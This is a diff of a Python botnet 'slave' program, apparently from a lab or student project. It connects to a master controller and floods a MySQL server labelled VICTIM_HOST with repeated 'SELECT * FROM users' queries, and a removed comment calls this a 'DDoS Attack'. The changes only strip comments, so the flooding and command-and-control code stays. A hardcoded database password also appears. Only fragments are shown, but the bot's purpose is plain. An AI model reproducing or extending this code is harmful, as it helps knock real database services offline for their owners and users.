@@ -4,7 +4,6 @@ from socket import *
 from time import ctime
 from mysql.connector import connect, Error
 
-##Setting up variables
 VICTIM_HOST = 'localhost'
 VICTIM_PORT = 3306
 MS_LISTEN_HOST = 'localhost'
@@ -19,20 +18,13 @@ class Slave():
         self.host = host
         self.port = port
         self.message = 'asdf'
-        #conn = input("How many connections do you want to make: ")
         ip = gethostbyname(self.host)
         self.num_connections = 0
         self.query = b"SELECT * FROM users"
-        # get ntp times
-        # ntpc = ntplib.NTPClient()
-        # ntp_res = ntpc.request('10.1.1.50', version=3)
-
-        # connect to master
         self.masterHost = MS_LISTEN_HOST
         self.masterPort = MS_LISTEN_PORT
         self.sockMaster = socket(AF_INET, SOCK_STREAM)
         self.sockMaster.connect((self.masterHost, self.masterPort))
-        # self.sockMaster.send('Slave offset is: {0}'.format(ntp_res.offset))
 
     def __del__(self):
         print("deleting the instance")
@@ -61,12 +53,7 @@ class Slave():
             self.ddos.send(self.query)
             self.sendQuery()
         except error as msg:
-            print("failed"+str(msg))
-        #    self.sendQuery()
-        #    self.num_connections = self.num_connections + 1
-        #    print("|[Connection Failed] | %d", self.num_connections)
-        #print("|[DDoS Attack Engaged] |")
-        # ddos.close
+            print("failed" + str(msg))
 
     def sendQuery(self):
         DBpassword = "botprojectbotproject"
@@ -92,6 +79,4 @@ class Slave():
 
 if __name__ == '__main__':
     slaveNode = Slave('localhost', 5000)
-    #while slaveNode:
-        #slaveNode.acceptMessages()
     slaveNode.acceptMessages()
